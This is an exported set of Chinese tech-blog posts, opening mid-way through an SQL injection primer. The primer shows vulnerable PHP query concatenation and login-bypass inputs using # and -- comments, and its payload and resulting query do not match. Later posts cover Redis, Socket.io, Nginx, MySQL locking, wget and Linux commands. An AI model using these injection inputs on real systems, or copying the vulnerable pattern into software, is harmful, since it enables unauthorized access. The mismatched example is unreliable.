&#39;&lt;hr&gt;&#39;;&#x2F;&#x2F;执行$result&#x3D;mysqli_query($conn, $sql);$row&#x3D;mysqli_fetch_array($result, MYSQLI_BOTH);if($row) &#123; echo &#39;Your Login name:&#39;.$row[&#39;username&#39;]; echo &#39;&lt;hr&gt;&#39;; echo &#39;Your Password:&#39;.$row[&#39;password&#39;];&#125;?&gt; 调用地址是http://127.0.0.1/sqli.php?id=1，使用GET传入参数id，输出的SQL 语句如下： 1SELECT * FROM Student WHERE id &#x3D; &#39;1&#39; 正常情况下，会返回id = 1 的学生信息。 1. 数字注入如果在浏览器中输入：http://127.0.0./sqli.php?id=1&#39; union select 1,2--+会怎样呢？输出的SQL 语句如下： 1SELECT * FROM Student WHERE id &#x3D; -1 or 1&#x3D;1 这会导致所有的学生信息都被输出了，为什么会这样呢？这是因为id = -1是一个不存在的条件，而1 = 1却是一个永远存在的条件，这就相当于没有加 Where 条件。 2. 字符串注入现在有这样一种场景：http://127.0.0./login.php模拟用户登录。假设正确的用户名和密码是Boo、122410，那么在正常的登录情况下所执行的SQL 语句如下： 1SELECT * FROM Student WHERE username &#x3D; &#39;Boo&#39; ADN password &#x3D; &#39;122410&#39; 由于用户名和密码都是字符串，所以SQL 注入会把参数携带的数据变成Mysql中的注释。Mysql 中的注释有两种。 1. #假设POST 传递的参数分别是：username = Boo&#39;#、password = xxxxxx，那么产生的SQL 语句则是： 1SELECT * FROM Student WHERE username &#x3D; &#39;Boo&#39;#&#39;ADN password &#x3D; &#39;xxxxxx&#39; 因为#号 后的所有字符串都会被当成注释来处理，所以上面的SQL 语句等价于： 1SELECT * FROM Student WHERE username &#x3D; &#39;Boo&#39; 2. --假设POST请求传递的参数分别是：username = Boo&#39;--、password = xxxxxx，那么产生的SQL 语句则是： 1SELECT * FROM Student WHERE username &#x3D; &#39;Boo&#39;-- &#39;AND password &#x3D; &#39;xxxxxx&#39; 因为--号 后面的所有内容都会被当成注释处理，所以上面的SQL 语句等价于： 1SELECT * FROM Student WHERE username &#x3D; &#39;Boo&#39; 无论是上面的哪一种情况，攻击者都能在不知道具体密码的情况下而成功登录。 这大概就是一个简单的SQL注入产生的完整过程了，这里只是抛砖引玉的介绍了下原理，而实际场景中的SQL 注入当然远远不止这两种。 参考链接SQL 注入常见方式以及检测方法","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"},{"name":"Web 安全","slug":"Web-安全","permalink":"https://www.0x2beace.com/tags/Web-%E5%AE%89%E5%85%A8/"}]},{"title":"Redis 常见事件整理","slug":"redis-common-events-collation","date":"2020-07-21T15:41:45.000Z","updated":"2020-07-21T15:42:45.608Z","comments":true,"path":"redis-common-events-collation/","link":"","permalink":"https://www.0x2beace.com/redis-common-events-collation/","excerpt":"这篇笔记用来整理 Redis 的常用事件。","text":"这篇笔记用来整理 Redis 的常用事件。 客户端事件客户端会发出一些事件的状态连接到Redis 服务器。 ReadyError客户端连接Redis 时，如果出现异常，则会触发Error 事件。 Connect客户端连接至Redis 时，会触发连接事件。 订阅者事件Message将接收到来自订阅频道的消息， 123client.on(&quot;message&quot;, function (channel, message) &#123; ...&#125;) Subscribe监听订阅事件，返回订阅频道的订阅数量。 123client.on(&quot;subscribe&quot;, function (channel, count) &#123; ...&#125;) 发布/订阅Publish将信息 message 发送到指定的频道 channel 。 返回值：接收到信息 message 的订阅者数量。 1PUBLISH channel message SUBSCRIBE订阅给定频道的信息。 返回值：接收到的信息。 1SUBSCRIBE channel [channel ...] 参考链接 Redis命令参考简体中文版 A high performance Node.js Redis client","categories":[{"name":"Redis","slug":"Redis","permalink":"https://www.0x2beace.com/categories/Redis/"}],"tags":[{"name":"Redis","slug":"Redis","permalink":"https://www.0x2beace.com/tags/Redis/"}]},{"title":"Socket.io 快速上手","slug":"socket-io-quick-start","date":"2020-07-20T05:02:05.000Z","updated":"2020-07-20T05:04:22.840Z","comments":true,"path":"socket-io-quick-start/","link":"","permalink":"https://www.0x2beace.com/socket-io-quick-start/","excerpt":"最近使用socket.io 和 redis 完成了一些小功能，觉得很实用，所以整理一下socket.io相关的知识。","text":"最近使用socket.io 和 redis 完成了一些小功能，觉得很实用，所以整理一下socket.io相关的知识。 socket.io 是什么它是一个服务端与客户端之间建立通讯的工具。 服务端创建好服务之后，客户端通过主机与之建立连接。然后就可以进行通讯了。 想要使用好socket.io，一定要理解通讯的概念。通讯一定是双向的，如果客户端能够收到消息，那么在某个地方就一定存在服务端向客户端推送消息。 快速上手要开始使用socket.io进行开发，需要先安装Node和npm。 创建一个名为app.js的文件，并添加以下代码。 12345678910111213141516var app &#x3D; require(&#39;express&#39;)();var http &#x3D; require(&#39;http&#39;).Server(app);&#x2F;&#x2F; 创建一个附加到http服务器的新socket.io实例var io &#x3D; require(&#39;socket.io&#39;)(http);app.get(&#39;&#x2F;&#39;, function(req, res)&#123; res.sendFile(__dirname + &#39;&#x2F;index.html&#39;);&#125;);io.on(&#39;connection&#39;, function(socket)&#123; console.log(&#39;a user connected&#39;);&#125;);http.listen(3000, function()&#123; console.log(&#39;listening on *:3000&#39;);&#125;); 这样就完成了一个最简单的socket服务端。 创建index.html 文件来作为客户端提供服务。 1234567&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;title&gt;Hello world&lt;&#x2F;title&gt; &lt;&#x2F;head&gt; &lt;body&gt;Hello world&lt;&#x2F;body&gt;&lt;&#x2F;html&gt; 启动服务 1node app.js 创建的服务运行在本地的 3000 端口上，打开浏览器，输入http://localhost:3000进行访问。 使用事件socket.io 的核心理念就是允许发送、接收任意事件和任意数据。任意能被编码为 JSON 的对象都可以用于传输。二进制数据 也是支持的。 在上面的代码中，我们已经创建了一个服务端的socket.io对象，如果想要能正常通讯，还需要在客户端同样也创建一个socket.io对象。这个脚本由服务端的/socket.io/socket.io.js 提供。 123456789101112&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;title&gt;Hello world&lt;&#x2F;title&gt; &lt;&#x2F;head&gt; &lt;script src &#x3D; &quot;&#x2F;socket.io&#x2F;socket.io.js&quot;&gt;&lt;&#x2F;script&gt; &lt;script&gt; var socket &#x3D; io(); &lt;&#x2F;script&gt; &lt;body&gt;Hello world&lt;&#x2F;body&gt;&lt;&#x2F;html&gt; 在客户端中建立 socket.io 连接。 在服务端中添加以下代码： 12345678910111213 ...&#x2F;&#x2F; 只有有客户端连接，就会触发这个事件io.on(&#39;connection&#39;, function(socket) &#123; console.log(&#39;A user connected&#39;); &#x2F;&#x2F; 只有有客户端断开连接，就会触发这个事件 socket.on(&#39;disconnect&#39;, function () &#123; console.log(&#39;A user disconnected&#39;); &#125;);&#125;); ... 现在再次访问http://localhost:3000，不仅可以在浏览器中看见hello world，如果刷新浏览器，还能在控制台中看见以下内容： 123A user connectedA user disconnectedA user connected 在上面的案例中，我们使用了socket.io的connection和disconnect事件，socket.io还有很多其中事件。 事件处理在服务端中有以下是保留字： Connect Message Disconnect Reconnect Ping Join and Leave 在客户端中以下是保留字： Connect Connect_error Connect_timeout Reconnect, etc 常用API客户端 提供的一些用于处理错误/异常的API。 1234567891011121314151617Connect − When the client successfully connects.Connecting − When the client is in the process of connecting.Disconnect − When the client is disconnected.Connect_failed − When the connection to the server fails.Error − An error event is sent from the server.Message − When the server sends a message using the send function.Reconnect − When reconnection to the server is successful.Reconnecting − When the client is in the process of connecting.Reconnect_failed − When the reconnection attempt fails. 广播广播意味着向所有连接的客户端发送消息。 要向所有客户端广播事件，我们可以使用io.sockets.emit方法。 12345678910111213 ...var clients &#x3D; 0;io.on(&#39;connection&#39;, function(socket) &#123; clients++; io.sockets.emit(&#39;broadcast&#39;,&#123; description: clients + &#39; clients connected!&#39;&#125;); socket.on(&#39;disconnect&#39;, function () &#123; clients--; io.sockets.emit(&#39;broadcast&#39;,&#123; description: clients + &#39; clients connected!&#39;&#125;); &#125;);&#125;); ... 广播在socket.io中应用的非常多，有广播就意味着有接收。需要在客户端中处理广播事件： 123456789101112131415&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;title&gt;Hello world&lt;&#x2F;title&gt; &lt;&#x2F;head&gt; &lt;script src &#x3D; &quot;&#x2F;socket.io&#x2F;socket.io.js&quot;&gt;&lt;&#x2F;script&gt; &lt;script&gt; var socket &#x3D; io(); socket.on(&#39;broadcast&#39;,function(data) &#123; document.body.innerHTML &#x3D; &#39;&#39;; document.write(data.description); &#125;); &lt;&#x2F;script&gt; &lt;body&gt;Hello world&lt;&#x2F;body&gt;&lt;&#x2F;html&gt; 可以尝试打开多个浏览器，输入http://localhost:3000，可能会得到以下结果： 参考链接 Socket.io Tutorial","categories":[{"name":"Node","slug":"Node","permalink":"https://www.0x2beace.com/categories/Node/"},{"name":"Socket.io","slug":"Node/Socket-io","permalink":"https://www.0x2beace.com/categories/Node/Socket-io/"}],"tags":[{"name":"Socket.io","slug":"Socket-io","permalink":"https://www.0x2beace.com/tags/Socket-io/"}]},{"title":"Nginx 常见配置","slug":"nginx-common-configuration","date":"2020-07-19T10:22:26.000Z","updated":"2020-07-19T10:24:25.144Z","comments":true,"path":"nginx-common-configuration/","link":"","permalink":"https://www.0x2beace.com/nginx-common-configuration/","excerpt":"最近接触Nginx 配置比较多，所以整理一下，方便后面回顾。","text":"最近接触Nginx 配置比较多，所以整理一下，方便后面回顾。 多站点配置如果一台服务器，需要配置多套站点，推荐使用 IP + 端口配置站点，然后使用反向代理指向端口。 站点配置 12345678910server &#123; listen 40001; location ~ \\.php &#123; ... &#125; location &#x2F; &#123; ... &#125;&#125; 多站点配置 123456789101112131415161718192021&#x2F;&#x2F; 站点1 server &#123; server_name yoursite.com; listen 80; location &#x2F; &#123; proxy_pass http:&#x2F;&#x2F;127.0.0.1:40001; index index.html index.htm index.jsp index.js; &#125;&#125;&#x2F;&#x2F; 站点2server &#123; server_name yoursite2.com; listen 80; location &#x2F; &#123; proxy_pass http:&#x2F;&#x2F;127.0.0.1:40001; index index.html index.htm index.jsp index.js; &#125;&#125; 反向代理反向代理其实已经在上面的配置中出现过了，多站点配置的原理就是利用反向代理。 123456789server &#123; server_name yoursite2.com; listen 80; location &#x2F; &#123; proxy_pass http:&#x2F;&#x2F;127.0.0.1:40001; index index.html index.htm index.jsp index.js; &#125;&#125; SSL 配置申请好证书之后，将其放在服务器上，然后编辑Nginx 配置： 12345678910111213server &#123; server_name yoursite.com; listen 443 ssl; ssl on; ssl_certificate ssl_0123cp_net&#x2F;full_chain.pem; &#x2F;&#x2F; 证书所在路径 ssl_certificate_key ssl_0123cp_net&#x2F;private.key; &#x2F;&#x2F; 证书对应的私钥所在路径 location &#x2F; &#123; proxy_pass http:&#x2F;&#x2F;127.0.0.1:40001; index index.html index.htm index.jsp index.js; &#125;&#125; http重定向配置好 https之后，还需要做一件事，才能保证 https能够正常访问。 因为访问任何一个网站时，默认使用的是http协议，所以需要在Web Server中配置http 自动跳转 https。 123456server &#123; server_name yoursite.com; listen 80; rewrite ^(.*) https:&#x2F;&#x2F;$server_name$1 permanent;&#125;","categories":[{"name":"Nginx","slug":"Nginx","permalink":"https://www.0x2beace.com/categories/Nginx/"}],"tags":[{"name":"Nginx","slug":"Nginx","permalink":"https://www.0x2beace.com/tags/Nginx/"}]},{"title":"Mac 开启 Mysql 日志记录","slug":"mac-open-mysql-logging","date":"2020-07-19T09:24:43.000Z","updated":"2020-07-20T05:06:44.373Z","comments":true,"path":"mac-open-mysql-logging/","link":"","permalink":"https://www.0x2beace.com/mac-open-mysql-logging/","excerpt":"有时候可能会想在本地开启Mysql 的日志记录，看看具体都执行了哪些SQL，其实非常简单。","text":"有时候可能会想在本地开启Mysql 的日志记录，看看具体都执行了哪些SQL，其实非常简单。 进入Mysql 命令行 1mysql -hlocalhost -uroot -p 全局开启普通日志记录 1set global general_log&#x3D;on; 查看Mysql 日志文件所在目录 1show variables like &#39;general_log_file&#39;; 实时查看日志记录 1tail -f &#x2F;your_mysql_log_file_path","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"},{"name":"Mac","slug":"Mac","permalink":"https://www.0x2beace.com/tags/Mac/"}]},{"title":"Mysql 行锁原因分析","slug":"analysis-of-the-causes-of-mysql-row-lock","date":"2020-07-19T09:03:04.000Z","updated":"2020-07-19T09:11:47.872Z","comments":true,"path":"analysis-of-the-causes-of-mysql-row-lock/","link":"","permalink":"https://www.0x2beace.com/analysis-of-the-causes-of-mysql-row-lock/","excerpt":"这篇文章来浅谈一下什么是Mysql 行锁，以及产生行锁的原因。","text":"这篇文章来浅谈一下什么是Mysql 行锁，以及产生行锁的原因。 锁的分类MySQL有三种锁的级别：页级、表级、行级。 表级锁：开销小，加锁快；不会出现死锁；锁定粒度大，发生锁冲突的概率最高,并发度最低。 行级锁：开销大，加锁慢；会出现死锁；锁定粒度最小，发生锁冲突的概率最低,并发度也最高。 页面锁：开销和加锁时间界于表锁和行锁之间；会出现死锁；锁定粒度界于表锁和行锁之间，并发度一般 因为这篇笔记只介绍Mysql 行锁，所以这里不对其他类型的锁做介绍了。 行锁InnoDB实现了两种类型的行锁: 共享锁【S锁】又称读锁，若事务T对数据对象A加上S锁，则事务T可以读A但不能修改A，其他事务只能再对A加S锁，而不能加X锁，直到T释放A上的S锁。这保证了其他事务可以读A，但在T释放A上的S锁之前不能对A做任何修改。 排他锁【X锁】又称写锁。若事务T对数据对象A加上X锁，事务T可以读A也可以修改A，其他事务不能再对A加任何锁，直到T释放A上的锁。这保证了其他事务在T释放A上的锁之前不能再读取和修改A。 所谓X锁,是事务T对数据A加上X锁时,只允许事务T读取和修改数据A; 所谓S锁,是事务T对数据A加上S锁时,其他事务只能再对数据A加S锁,而不能加X锁,直到T释放A上的S锁 场景重现 首先创建一个 InnoDB类型的数据表，SQL 如下： 1234CREATE TABLE &#96;gap&#96; ( &#96;id&#96; int(11) DEFAULT NULL, KEY &#96;ind_gap_id&#96; (&#96;id&#96;)) ENGINE&#x3D;InnoDB DEFAULT CHARSET&#x3D;utf8; 创建会话1，开启事务A并执行update 语句 12start transaction;update gap set id &#x3D; 30 where id &#x3D; 33; 创建会话2，开启事务B并执行另一个update 语句 12start transaction;update gap set id &#x3D; 22 where id &#x3D; 20; 在会话2中 插入20 &gt; id &lt; 39范围外的值时 可以执行成功,而当要插入 [20,39)范围内的值时 会遇到gap lock 。 用会话1 查看当前正在进行中的事务1SELECT * FROM information_schema.INNODB_TRX; 不会意外，能看到下面两条记录： 可以看到 进程id为3175 的事务在锁住了，而另一个id为3173的事务正在执行，但是没有提交事务。 这是因为执行update 语句之后，mysql 会执行索引扫描并在该表上施加一个 next-key lock ,向左扫描到20,向右扫描到39 ,锁定区间左闭右开,所以lock的范围是 [20,39)。 解决办法根据实际情况的不同，有不同的方式可以避免死锁，这里介绍常用的几种： 改变数据库操作逻辑，尽量避免在不同的事务中，对同一条记录进行更改。 如果不同程序会并发存取多个表，尽量约定以相同的顺序访问表，可以大大降低死锁机会。 参考链接 Mysql 死锁原因分析","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"Mysql 查看死锁和解除死锁","slug":"mysql-view-deadlock-and-release-deadlock","date":"2020-07-19T08:07:48.000Z","updated":"2020-07-19T09:10:18.298Z","comments":true,"path":"mysql-view-deadlock-and-release-deadlock/","link":"","permalink":"https://www.0x2beace.com/mysql-view-deadlock-and-release-deadlock/","excerpt":"前段时间遇到了一个Mysql 死锁相关的问题，整理一下。","text":"前段时间遇到了一个Mysql 死锁相关的问题，整理一下。 问题描述：Mysql 的修改语句似乎都没有生效，同时使用Mysql GUI 工具编辑字段的值时会弹出异常。 什么是死锁在解决Mysql 死锁的问题之前，还是先来了解一下什么是死锁。 死锁是指两个或两个以上的进程在执行过程中,因争夺资源而造成的一种互相等待的现象,若无外力作用,它们都将无法推进下去.此时称系统处于死锁状态或系统产生了死锁,这些永远在互相等的进程称为死锁进程。 死锁的表现死锁的具体表现有两种： Mysql 增改语句无法正常生效 使用Mysql GUI 工具编辑字段的值时，会出现异常。 如何避免死锁阻止死锁的途径就是避免满足死锁条件的情况发生，为此我们在开发的过程中需要遵循如下原则： 1.尽量避免并发的执行涉及到修改数据的语句。 2.要求每一个事务一次就将所有要使用到的数据全部加锁，否则就不允许执行。 3.预先规定一个加锁顺序，所有的事务都必须按照这个顺序对数据执行封锁。如不同的过程在事务内部对对象的更新执行顺序应尽量保证一致。 查看死锁Mysql 查询是否存在锁表有多种方式，这里只介绍一种最常用的。 1. 查看正在进行中的事务1SELECT * FROM information_schema.INNODB_TRX 可以看到 进程id为3175 的事务在锁住了，而另一个id为3173的事务正在执行，但是没有提交事务。 2. 查看正在锁的事务1SELECT * FROM INFORMATION_SCHEMA.INNODB_LOCKS; 3. 查看等待锁的事务1SELECT * FROM INFORMATION_SCHEMA.INNODB_LOCK_WAITS; 4. 查询是否锁表1SHOW OPEN TABLES where In_use &gt; 0; 5. 查看最近死锁的日志1show engine innodb status 在发生死锁时，这几种方式都可以查询到和当前死锁相关的信息。 解除死锁如果需要解除死锁，有一种最简单粗暴的方式，那就是找到进程id之后，直接干掉。 查看当前正在进行中的进程。 1234show processlist&#x2F;&#x2F; 也可以使用SELECT * FROM information_schema.INNODB_TRX; 上面两个命令找出来的进程id 是同一个。 杀掉进程对应的进程 id 1kill id 验证（kill后再看是否还有锁） 1SHOW OPEN TABLES where In_use &gt; 0; 参考链接 Mysql 查看表和解锁表 Mysql 死锁是什么？","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"如何把 Console.log 的标准输出记录到文件","slug":"how-to-put-console-log-the-standard-output-of-is-recorded-to-a-file","date":"2020-07-18T08:16:51.000Z","updated":"2020-07-18T08:47:27.103Z","comments":true,"path":"how-to-put-console-log-the-standard-output-of-is-recorded-to-a-file/","link":"","permalink":"https://www.0x2beace.com/how-to-put-console-log-the-standard-output-of-is-recorded-to-a-file/","excerpt":"最近遇到了这样一个需求，在不改动之前的任何一行代码的前提下，如何把console.log的标准输出全部记录到文件中呢？","text":"最近遇到了这样一个需求，在不改动之前的任何一行代码的前提下，如何把console.log的标准输出全部记录到文件中呢？ 我是没有选择那些大名鼎鼎的日志模块，如： winston - A logger for just about everything. log4js - A port of log4js to node.js 因为我的需求够简单，只需要能把日志记录到文件就行，所以使用了下面这种最简单的方式： 12345678910111213141516var log_file &#x3D; fs.createWriteStream(path.resolve(__dirname, &quot;.pm2&quot;) + &#39;&#x2F;debug.log&#39;, &#123;flags : &#39;w&#39;&#125;);var log_stdout &#x3D; process.stdout;&#x2F;** * 重载console.log 函数 *&#x2F;console.log &#x3D; function() &#123; var res &#x3D; &quot;&quot;, len &#x3D; arguments.length; for(var i&#x3D;0; i&lt;len; i++)&#123; res +&#x3D; arguments[i]; &#125; log_file.write(util.format(res) + &#39;\\n&#39;); log_stdout.write(util.format(res) + &#39;\\n&#39;);&#125;; 参考链接 Node: log in a file instead of the console","categories":[{"name":"一些经验","slug":"一些经验","permalink":"https://www.0x2beace.com/categories/%E4%B8%80%E4%BA%9B%E7%BB%8F%E9%AA%8C/"}],"tags":[{"name":"Node","slug":"Node","permalink":"https://www.0x2beace.com/tags/Node/"}]},{"title":"解决Firefox “已阻止载入混合活动内容”","slug":"resolve-firefox-has-blocked-loading-of-mixed-active-content","date":"2020-07-18T07:15:30.000Z","updated":"2020-09-20T15:40:46.029Z","comments":true,"path":"resolve-firefox-has-blocked-loading-of-mixed-active-content/","link":"","permalink":"https://www.0x2beace.com/resolve-firefox-has-blocked-loading-of-mixed-active-content/","excerpt":"最近需要将项目迁移至一台新的服务器，其中涉及到多个站点的http与https之间的转换。 网站起初不能正常访问时，我没在意，以为是网络延迟（因为服务器放在国外），直到我打开控制台发现了如下异常：","text":"最近需要将项目迁移至一台新的服务器，其中涉及到多个站点的http与https之间的转换。 网站起初不能正常访问时，我没在意，以为是网络延迟（因为服务器放在国外），直到我打开控制台发现了如下异常： 这时我才意识到并不是网络延迟的问题，而是项目没有配置好。 什么是混合内容 当用户访问使用HTTPS的页面时，他们与web服务器之间的连接是使用SSL加密的，从而保护连接不受嗅探器和中间人攻击。如果HTTPS页面包括由普通明文HTTP连接加密的内容，那么连接只是被部分加密：非加密的内容可以被嗅探者入侵，并且可以被中间人攻击者修改，因此连接不再受到保护。当一个网页出现这种情况时，它被称为混合内容页面。 —— MDN 通俗一点解释就是：https 的页面中混合着http 的请求，而这种请求不会被浏览器正常接受的，也被称作为混合内容页面。 解决方案既然已经明白了为什么会产生这个问题，那么要解决起来也就非常简单了。 让Firefox暂时不阻止 打开新标签页，在地址栏输入 about:config，进入FireFox高级配置页面。 搜索security.mixed_content.block_active_content，将默认值true更改为false。 这种方式仅适用于本地调试。 避免在HTTPS页面中包含HTTP的内容更直接有效的方式应该是约定好项目中的协议，统一使用https或者http。 参考连接 什么是混合内容——MDN https访问遇到“已阻止载入混合内容”","categories":[{"name":"一些经验","slug":"一些经验","permalink":"https://www.0x2beace.com/categories/%E4%B8%80%E4%BA%9B%E7%BB%8F%E9%AA%8C/"}],"tags":[{"name":"HTTPS","slug":"HTTPS","permalink":"https://www.0x2beace.com/tags/HTTPS/"},{"name":"HTTP","slug":"HTTP","permalink":"https://www.0x2beace.com/tags/HTTP/"}]},{"title":"Vim 安装 molokai 配色方案","slug":"vim-install-molokai-color-scheme","date":"2020-07-18T06:36:04.000Z","updated":"2020-07-18T06:38:53.741Z","comments":true,"path":"vim-install-molokai-color-scheme/","link":"","permalink":"https://www.0x2beace.com/vim-install-molokai-color-scheme/","excerpt":"像solarized、gruvbox、 molokai、这些都是大名鼎鼎的VIM 配色方案，本文只介绍如何安装 molokai 。","text":"像solarized、gruvbox、 molokai、这些都是大名鼎鼎的VIM 配色方案，本文只介绍如何安装 molokai 。 按照顺序执行完上面的命令，即可使用最经典的配色方案了。 1234567cd ~mkdir .vim &amp;&amp; cd .vimgit clone https:&#x2F;&#x2F;github.com&#x2F;tomasr&#x2F;molokai.gitcp -rf molokai&#x2F;colors&#x2F; .&#x2F;colorsecho colorscheme molokai &gt;&gt; ~&#x2F;.vimrcecho set t_Co&#x3D;256 &gt;&gt; ~&#x2F;.vimrcecho set background&#x3D;dark &gt;&gt; ~&#x2F;.vimrc 实际效果：","categories":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/categories/Tutorial/"}],"tags":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/tags/Tutorial/"},{"name":"Vim","slug":"Vim","permalink":"https://www.0x2beace.com/tags/Vim/"}]},{"title":"sshd_config 常用配置项","slug":"sshd-config-common-configuration-items","date":"2020-07-17T15:17:09.000Z","updated":"2020-07-17T15:18:28.234Z","comments":true,"path":"sshd-config-common-configuration-items/","link":"","permalink":"https://www.0x2beace.com/sshd-config-common-configuration-items/","excerpt":"这篇笔记用来收录那些常用的sshd_config配置项。","text":"这篇笔记用来收录那些常用的sshd_config配置项。 保持链接保持客户端与服务端之间的连接保持活动状态似乎是最常见策略。 ServerAliveInterval：客户端在向服务器发送空数据包之前（等待连接保持活动状态）将等待的秒数。 ClientAliveInterval：服务器在向客户端发送空数据包之前（等待连接保持活动状态）将等待的秒数。 设置为0（默认值）将禁用这些功能，因此如果空闲时间太长，连接可能会断开。 12345Host myhostshortcut HostName myhost.com User barthelemy ServerAliveInterval 60 ServerAliveCountMax 10 这么设置的作用是：客户端将等待空闲60秒钟（ServerAliveInterval时间），然后向服务器发送 no-op null数据包，并期待响应。 如果没有响应，则它将继续尝试上述过程直到10次（ServerAliveCountMax 次数 10 * 60 = 600秒）。如果服务器仍然没有响应，则客户端将断开ssh连接。 参考链接 如何让ssh客户端与服务端保持连接 sshd_config 参考手册","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"命令整理","slug":"Linux/命令整理","permalink":"https://www.0x2beace.com/categories/Linux/%E5%91%BD%E4%BB%A4%E6%95%B4%E7%90%86/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"ssh","slug":"ssh","permalink":"https://www.0x2beace.com/tags/ssh/"}]},{"title":"Wget 使用技巧","slug":"wget-tips","date":"2020-07-16T15:30:39.000Z","updated":"2020-07-16T15:31:23.790Z","comments":true,"path":"wget-tips/","link":"","permalink":"https://www.0x2beace.com/wget-tips/","excerpt":"wget 是一个命令行的下载工具，对于经常使用Linux的用户来说，真是再熟悉不过了。下面总结了一些实用的wget使用技巧，可能会让你更加高效地使用 wget。","text":"wget 是一个命令行的下载工具，对于经常使用Linux的用户来说，真是再熟悉不过了。下面总结了一些实用的wget使用技巧，可能会让你更加高效地使用 wget。 重命名最常见的使用方式： 1$ wget http:&#x2F;&#x2F;example.com&#x2F;filename.txt wget默认会以最后一个符合 / 的后面的字符来对下载文件命名，对于动态链接的下载通常文件名会不正确。 如果希望对这个下载的文件进行重命名，我们可以使用参数 -O 来指定一个文件名： 1$ wget -O file.zip http:&#x2F;&#x2F;example.com&#x2F;filename.txt 后台下载当需要下载比较大的文件时，使用参数 -b 可以隐藏在后台进行下载： 1$ wget -b http:&#x2F;&#x2F;wppkg.baidupcs.com&#x2F;issue&#x2F;netdisk&#x2F;MACguanjia&#x2F;BaiduNetdisk_mac_3.2.0.9.dmg 然后可以使用以下命令查看当前的进度： 1$ tail -f wget-log 下载目录这条命令可以下载 http://example.com 网站上 packages 目录中的所有文件。 参数说明： -r：下载目录 -np：不遍历父目录 -nd：不在本机重新创建目录结构 1$ wget -r -np -nd http:&#x2F;&#x2F;example.com&#x2F;packages&#x2F; 与上一条命令相似，但多加了一个 --accept=iso 选项，这指示 wget 仅下载 i386 目录中所有扩展名为 iso 的文件。你也可以指定多个扩展名，只需用逗号分隔即可。 1$ wget -r -np -nd --accept&#x3D;iso http:&#x2F;&#x2F;example.com&#x2F;centos-5&#x2F;i386&#x2F; 批量下载此命令常用于批量下载的情形，把所有需要下载文件的地址放到 filename.txt 中，然后 wget 就会自动为你下载所有文件了。 1$ wget -i filename.txt 断点续传通常我们在下载大文件时，为了防止中途因为网络不稳定等因素所引起的下载失败，可以使用 -c 参数，作为断点续传。 好处是：如果当时下载失败了，之后再次下载该文件时，会继续上一次的下载，而不用重头下载了。 1$ wget -c http:&#x2F;&#x2F;example.com&#x2F;really-big-file.iso 其他该命令可用来镜像一个网站，wget 将对链接进行转换。如果网站中的图像是放在另外的站点，那么可以使用 -H 选项 1$ wget -m -k (-H) http:&#x2F;&#x2F;www.example.com&#x2F; 参考链接 wget 使用技巧","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"命令整理","slug":"Linux/命令整理","permalink":"https://www.0x2beace.com/categories/Linux/%E5%91%BD%E4%BB%A4%E6%95%B4%E7%90%86/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"}]},{"title":"一些实用的 Linux 命令","slug":"some-practical-linux-commands","date":"2020-07-16T15:26:13.000Z","updated":"2020-09-05T02:10:46.310Z","comments":true,"path":"some-practical-linux-commands/","link":"","permalink":"https://www.0x2beace.com/some-practical-linux-commands/","excerpt":"这篇笔记的目的是用来整理那些不常用但又很实用的Linux 命令。","text":"这篇笔记的目的是用来整理那些不常用但又很实用的Linux 命令。 sudo !!有时候我们好不容易输完一长串命令，却被提示”权限不足”，如果这个时候有一个命令记住上一次的输入内容那该多好。 还真有，!!命令可以获取最后一次输入的命令，所以我们直接输入下面这个命令就可以了。 1$ sudo !! 注意中间有一个空格。 nlnl 命令类似cat命令，都是查看文件内容，但不同之处在于：nl命令会在文本内容的每一行前面，添加行号。 123456$ cat test.txtboomac$ nl test.txt1. boo2. mac tree以树状的形式返回当前目录的文件夹结构，这个命令很好用。 12345$ tree .└── test.txt0 directories, 1 file pstree和tree类似，不过它是返回当前运行的所有进程及其相关的子进程的树状结构。 1234$ pstree | grep php|-+&#x3D; 01365 boo nginx: master process &#x2F;usr&#x2F;local&#x2F;opt&#x2F;nginx&#x2F;bin&#x2F;nginx -g daemon off; | \\--- 01410 boo nginx: worker process | | \\--- 73098 boo grep --color&#x3D;auto nginx dig这个命令特别实用，可以用来查看域名解析情况。 123456789101112131415dig 0x2BeAce.com +nostats +nocomments +nocmd; &lt;&lt;&gt;&gt; DiG 9.10.6 &lt;&lt;&gt;&gt; 0x2BeAce.com +nostats +nocomments +nocmd;; global options: +cmd;0x2BeAce.com. IN A0x2BeAce.com. 3581 IN A 185.199.108.1530x2BeAce.com. 3581 IN A 185.199.110.1530x2BeAce.com. 3581 IN A 185.199.111.1530x2BeAce.com. 3581 IN A 185.199.109.1530x2BeAce.com. 3581 IN NS ns12.domaincontrol.com.0x2BeAce.com. 3581 IN NS ns11.domaincontrol.com.ns12.domaincontrol.com. 59833 IN A 173.201.73.6ns11.domaincontrol.com. 92984 IN A 97.74.105.6ns12.domaincontrol.com. 146699 IN AAAA 2603:5:2290::6ns11.domaincontrol.com. 92042 IN AAAA 2603:5:2190::6 &lt;空格&gt; 命令这是一个有趣的命令，总所周知，用户在终端上键入的每一个命令都会被记录到history中，那么有没有一个命令可以骗过history，而不被记入呢？答案是有的。 